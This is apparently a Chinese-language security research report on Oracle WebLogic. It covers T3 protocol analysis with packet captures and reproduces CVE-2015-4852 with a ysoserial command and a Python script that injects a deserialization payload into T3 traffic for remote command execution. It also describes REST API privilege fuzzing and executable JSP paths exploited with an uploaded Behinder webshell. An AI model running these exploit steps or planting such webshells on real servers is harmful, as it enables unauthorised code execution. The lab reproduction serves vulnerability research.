## t3反序列化接口分析

网上对t3协议分析的流程图

![image-t3](C:\Users\Jack\Documents\MyReport\week8\t3.jpg)

通过修改之前利用jndi注入的代码，客户端向weblogic服务器绑定对象，使用t3接口

```java
package weblogic;

import org.apache.commons.lang.RandomStringUtils;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.lang.reflect.Field;
import java.util.Hashtable;

public class T3 {
    static String JNDI_FACTORY="weblogic.jndi.WLInitialContextFactory";
    private static InitialContext getInitialContext(String url)throws NamingException
    {
        Hashtable<String,String> env = new Hashtable<String,String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
        env.put(Context.PROVIDER_URL, url);
        return new InitialContext(env);
    }
    //iiop
    //iiop
    public static void main(String args[]) throws Exception {
        InitialContext c=getInitialContext("t3://192.168.0.102:7001");

        String StrObj=new String("12345");
        String ranStr= RandomStringUtils.random(5, new char[]{'a','b','c','d','e','f', '1', '2', '3'});
        c.bind(ranStr,StrObj);
        c.lookup(ranStr);
        System.out.println("done");
    }
}
```

使用wireshark抓包可获取t3通信的数据流，绑定的字符串为12345，客户端将字符串序列化之后发送到服务器，可以在数据流中找到字符串的序列化数据，如果服务器要将该对象成功反序列化，则相应的类必须存在于服务上

```
客户端：
t3 12.2.1
AS:255
HL:19
MS:10000000
LP:DOMAIN
PU:t3://192.168.0.102:7001

服务器：
HELO:12.2.1.3.0.false
AS:2048
HL:19
MS:10000000
PN:DOMAIN

客户端发送详细信息：
.....e............q...`....a...1..wR:./!#..;*..(....ysr.xr.xr.xp.....................pppppp.....................p.........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitlet..Ljava/lang/String;L.
implVendorq.~..L..implVersionq.~..xpw...x........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.$weblogic.common.internal.VersionInfo."EQdRF>...[..packagest.'[Lweblogic/common/internal/PackageInfo;L..releaseVersiont..Ljava/lang/String;[..versionInfoAsBytest..[Bxr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitleq.~..L.
implVendorq.~..L..implVersionq.~..xpw...x........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.!weblogic.common.internal.PeerInfoXTt........I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatch[..packagest.'[Lweblogic/common/internal/PackageInfo;xr.$weblogic.common.internal.VersionInfo."EQdRF>...[..packagesq.~..L..releaseVersiont..Ljava/lang/String;[..versionInfoAsBytest..[Bxr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitleq.~..L.
implVendorq.~..L..implVersionq.~..xpw...x...........sr..weblogic.rjvm.JVMID.I.>...*...xpwS!.........
192.168.0.102..host.docker.internal.;.........Y.........................x........sr..weblogic.rjvm.JVMID.I.>...*...xpw.....1.....
172.20.0.1.........x
服务器发送详细信息：
.....e................`....E...........D..=(.+......ysr.xr.xr.xp.....................pppppp.....................p........t3://172.18.0.2:7001.........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr..weblogic.rjvm.ClusterInfo90.s	..S.....xpw...x........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitlet..Ljava/lang/String;L.
implVendorq.~..L..implVersionq.~..xpw...x........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.$weblogic.common.internal.VersionInfo."EQdRF>...[..packagest.'[Lweblogic/common/internal/PackageInfo;L..releaseVersiont..Ljava/lang/String;[..versionInfoAsBytest..[Bxr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitleq.~..L.
implVendorq.~..L..implVersionq.~..xpw...x........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr.!weblogic.common.internal.PeerInfoXTt........I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatch[..packagest.'[Lweblogic/common/internal/PackageInfo;xr.$weblogic.common.internal.VersionInfo."EQdRF>...[..packagesq.~..L..releaseVersiont..Ljava/lang/String;[..versionInfoAsBytest..[Bxr.$weblogic.common.internal.PackageInfo..#.......	I..majorI..minorI..patchUpdateI..rollingPatchI..servicePackZ..temporaryPatchL.	implTitleq.~..L.
implVendorq.~..L..implVersionq.~..xpw...x...........sr..weblogic.rjvm.JVMID.I.>...*...xpwr....1.....
172.20.0.1...........[.L.Aw.
172.18.0.2..5H.......Y...Y......................base_domain..AdminServer..x........sr..weblogic.rjvm.JVMID.I.>...*...xpwT...[.L.Aw.
172.18.0.2..5H.......Y...Y......................base_domain..AdminServer.x
客户端发送绑定请求以及反序列化数据
.../.e........	.......t..aeda1t..12345sr.xp?@......w.........t..java.naming.factory.initialt.%weblogic.jndi.WLInitialContextFactoryt..java.naming.provider.urlt..t3://192.168.0.102:7001xp.........sr..weblogic.rjvm.ClassTableEntry/Re.W......xpr..java.util.Hashtable...%!J.....F.
loadFactorI.	thresholdxpw...x........sr.%weblogic.rjvm.ImmutableServiceContext...pc......xr.)weblogic.rmi.provider.BasicServiceContext.c"6.......xpw...sr.&weblogic.rmi.internal.MethodDescriptor.HZ....{...xpwE.?bind(Ljava.lang.String;Ljava.lang.Object;Ljava.util.Hashtable;)...	xx...
服务器响应
.....e.............p....
客户端发送查找请求
.....e........	.......t..aeda1sr.xp?@......w.........t..java.naming.factory.initialt.%weblogic.jndi.WLInitialContextFactoryt..java.naming.provider.urlt..t3://192.168.0.102:7001xp..........sr.%weblogic.rjvm.ImmutableServiceContext...pc......xr.)weblogic.rmi.provider.BasicServiceContext.c"6.......xpw...sr.&weblogic.rmi.internal.MethodDescriptor.HZ....{...xpw5./lookup(Ljava.lang.String;Ljava.util.Hashtable;)...	xx...
服务器返回序列化之后的对象
... .e.............t..12345p....

```

通过python的socket接口向weblogic也可以发送t3请求，对于存在t3反序列化漏洞的版本，可以这样构造恶意代码造成远程命令执行

```python
import socket
import struct
import sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ("192.168.0.102", 7001)
print ('connecting to ')
sock.connect(server_address)

# Send headers
headers='t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
headers_bytes = headers.encode('utf-8')
print( 'sending ')
sock.sendall(headers_bytes)


data = sock.recv(1024)
print ( 'received "%s"' % data)

# the evil obj can be sent if the vulnerability exists
...
```

![image-20230714003921173](C:\Users\Jack\Documents\MyReport\week8\image-20230714003921173-16902137501053.png)



**具体攻击方式**

对t3数据包进行进一步分析

- 每个数据包里不止包含一个序列化魔术头（0xac 0xed 0x00 0x05）
- 每个序列化数据包前面都有相同的二进制串（0xfe 0x01 0x00 0x00）
- 每个数据包上面都包含了一个T3协议头，发现前面四个字节是数据包长度

![img](C:\Users\Jack\Documents\MyReport\week8\t010438efe9d5afaa18.png)

攻击思路：数据包中包含多个序列化的对象，可以尝试构造恶意对象并替换其中的一个序列化对象，然后封装到数据包中重新发送

![img](C:\Users\Jack\Documents\MyReport\week8\t01930ddfbdb4fc2f6a.png)

CVE-2015-4852漏洞复现 （t3反序列化漏洞）

```
java -jar ysoserial.jar CommonsCollections1 'touch /test.txt' > payload.bin
```

python攻击脚本

```python
import socket
import struct
import sys
from scapy.all import *

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ("192.168.0.102", 7001)
print ('connecting to ')
sock.connect(server_address)

# Send headers
headers='t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
headers_bytes = headers.encode('utf-8')
print( 'sending ')
sock.sendall(headers_bytes)


data = sock.recv(1024)
print ( 'received "%s"' % data)

######################################以下是具体的攻击部分#####################################

# 传入一个文件名，在本例中为刚刚生成的
payloadObj = open("payload.bin",'rb').read()

# 读取 .pcap 文件
packets = rdpcap('t3.pcap')

# 然后可以通过索引访问单个数据包
# 这里获取第一个数据包（索引为 0）
origin_packet = packets[0]

# 如果数据包的负载是需要的部分，可以这样获取
payload = origin_packet[Raw].load

# 截取整个payload 的一部分，从24到155
payload_head = payload[23:155]

# 复制剩余数据包，从408到1564
payload_tail=payload[408:1564]

#重新组成payload
payload=payload_head+payloadObj+payload_tail

# 重新计算数据包大小并替换原数据包中的前四个字节
payload = "{0}{1}".format(struct.pack('!i', len(payload)), payload[4:])

print('sending payload...')
sock.send(payload)
```

![image-20230725015601524](C:\Users\Jack\Documents\MyReport\week8\image-20230725015601524.png)





## rest api 测试：

#### 模糊批量测试，使用普通用户cookie去操作所有edit api，根据返回结果来看是否存在越权

导入并解析所有rest api，然后使用不同用户的身份认证信息，测试用户是否能执行超出自己权限的操作，get请求和post请求在url中都不带任何查询参数，url中的{version}变量设置为latest，{name}变量设置为testing，post的body设置为空



测试的用户有三种，认证方式为用户名和密码，也就是在http头中加入的basic authentication

普通用户：没有rest api的访问权限

monitor用户：具有一般的查看权限，但没有写入权限

admin用户：具有rest api的所有权限



返回值类型

400：bad request，如果post请求不在头部中加入X-Requested-By的话，就一定会返回400，此外，某些post型的api会检查请求是否符合格式要求，比如body中一定要有name这个属性，有些post型请求的body可以设置为{}

401：如果用户不存在，即账号密码错误，则会返回401

403：forbidden，即权限不够，如果用户想访问超出自己权限的资源时，就会返回forbidden

404：uri not found，因为是testing只是一个占位符，并不是真的存在testing这个资源，所以所有包含testing的请求返回都会是404

200：执行成功



参与测试的URL一共是1695个

admin：

Response: 404的URL为1428个

Response: 403的URL为0

Response: 400的URL为74个

Response: 200的URL为193个

admin用户不会出现权限不够的问题，返回4开头的状态码主要是因为testing资源不存在和post的数据体的格式不对，而返回200的请求中get请求为161个，post请求为32个



monitor：

Response: 404的URL为1428个

Response: 403的URL为94个

Response: 400的URL为11个

Response: 200的URL为162个

minitor用户的返回200的get请求为161个，post请求为1个，也就是说monitor只有唯一一个post请求可以执行成功，这个post请求是search，并不涉及到对数据的修改，与monitor的身份权限一致，而返回400的11个请求中，全部都用postman再次测试，发现返回值都变成了401，也是unauthorized



normal user：

Response: 403的URL为1695个

普通用户没有访问rest api的权限，所以所有请求的返回值都是403

#### 继续查看所有可能存在弱点的rest api，具体、针对性的测试

#### **filestore api看是否能创建文件，是否能控制文件名，是否能控制写入内容**

filestore api可以控制文件存储位置，也可以控制文件名，创建的持久化存储名为AdminStore，那么数据文件名为ADMINSTORE000000.DAT，创建的持久化存储名为teststore，那么数据文件名为TESTSTORE000000.DAT

如果要向持久化存储写入数据，则需要创建一个JMS服务器，再创建一个JMS模块，然后在JMS模块中添加一个JNDI连接工厂，一个JNDI消息队列。然后在服务器上部署一个war包，war包中的java代码需要使用之前创建的JNDI连接工厂，并通过JNDI消息队列写入持久化存储的消息，核心代码如下：

```java
package Servlets;

import javax.servlet.*;
import javax.servlet.annotation.WebServlet;
import java.io.IOException;
import javax.jms.*;
import javax.naming.*;



@WebServlet("/hello")
public class ServletDemo implements  Servlet{

    public void init(ServletConfig servletConfig) throws ServletException {

    }
    public ServletConfig getServletConfig() {
        return null;
    }

    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {

        System.out.println("hello");
        try {
// 获取JNDI上下文
            Context jndiContext = new InitialContext();

            // 查找连接工厂和队列
            ConnectionFactory connectionFactory = (ConnectionFactory) jndiContext.lookup("testfactory");
            Queue queue = (Queue) jndiContext.lookup("testqueue");

            // 创建连接
            Connection connection = connectionFactory.createConnection();
            Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);

            // 创建消息生产者
            MessageProducer producer = session.createProducer(queue);

            // 创建并发送消息
            TextMessage message = session.createTextMessage();
            message.setText("Hello, this is a persistent message.");
            producer.send(message, DeliveryMode.PERSISTENT, Message.DEFAULT_PRIORITY, Message.DEFAULT_TIME_TO_LIVE);

            // 关闭连接
            session.close();
            connection.close();
        } catch (NamingException | JMSException e) {
            e.printStackTrace();
        }

    }
    public String getServletInfo() {
        return null;
    }

    public void destroy() {

    }
}
```

通过创建一个servlet去执行相关代码，访问/hello路由之后，将会创建一个消息生产者，通过消息生产者向队列中写入持久化存储的消息"Hello, this is a persistent message."，执行完这部分代码之后，在ADMINSTORE000000.DAT文件中就可以看到相应的消息已经存入文件中。

![image-20230726134742560](C:\Users\Jack\Documents\MyReport\week8\image-20230726134742560.png)

总体来说，对存储文件的写入需要JMS模块，虽然持久化存储的文件路径和文件名都可以通过rest api指定，但利用写入消息的过程难度较大，需要利用部署好的web应用程序。



















### 白盒测试方法

尝试白盒测试，weblogic的服务器逻辑代码主要存储在D:\Oracle\Middleware\Oracle_Home\wlserver\server\lib和D:\Oracle\Middleware\Oracle_Home\wlserver\modules目录下，将这两个目录复制出来，然后用7-zip对目录下所有jar包进行解压，执行以下命令

```
for /R "D:\security\findclass\lib" %i in (*.jar) do "D:\security\7-Zip\7z.exe" x "%i" -o"D:\security\findclass\extract\%~nI" -y

for /R "D:\security\findclass\modules" %i in (*.jar) do "D:\security\7-Zip\7z.exe" x "%i" -o"D:\security\findclass\extract\%~nI" -y
```

然后使用filelocator去对D:\security\findclass\extract目录搜索关键字，尝试定位rest api的处理逻辑

对于rest api：127.0.0.1:7001/management/weblogic/latest/edit/serverTemplateCreateForm，搜索serverTemplateCreateForm，但没有结果

![image-20230716230942127](C:\Users\Jack\Documents\MyReport\week8\image-20230716230942127.png)



搜索latest关键字，几乎所有api都使用latest这个字符表示版本，可以搜到结果，但是结果太多，找其中可能性大的进一步分析

![image-20230716231729994](C:\Users\Jack\Documents\MyReport\week8\image-20230716231729994.png)



在调试过程中发现，在D:\Oracle\Middleware\Oracle_Home\oracle_common\modules目录下，还有部分weblogic相关的代码，也就是，最新版weblogic（14.1.1.0）的需要加载的代码，与之前发生了变化，尤其是与rest api相关的内容，很多都出现在该目录下，weblogic的rest api实现部分很多都依赖于jersey库，该库也位于这个目录下



不过即使在加载了这三个文件夹的情况下，在调试过程中仍然会有极少数逻辑显示本地没有相应代码，最保险的方式还是直接搜索weblogic文件夹下的所有jar文件，然后放在一个文件夹中，作为依赖库导入项目中







rest api fuzz 批量测试 用普通用户cookies

E:\Oracle\Middleware\Oracle_Home\wlserver\server\lib\consoleapp\webapp\css文件目录下的jsp文件具有执行权限，webapp的本来的jsp文件都存放在layouts文件夹下，但是直接访问该文件下的任何jsp文件都会直接回到登录页面，其他的文件夹有些可以访问，如css，images文件夹可访问，文件下的css文件和图片文件也可以访问，同时，如果这些文件夹下的创建的jsp文件也可以执行，如果存在上传文件的途径，把jsp脚本传到这个目录下，就可以执行恶意代码，如注册内存马等。以下为上传冰蝎jsp脚本，并连接成功的结果。

![image-20230726165212290](C:\Users\Jack\Documents\MyReport\week8\image-20230726165212290.png)

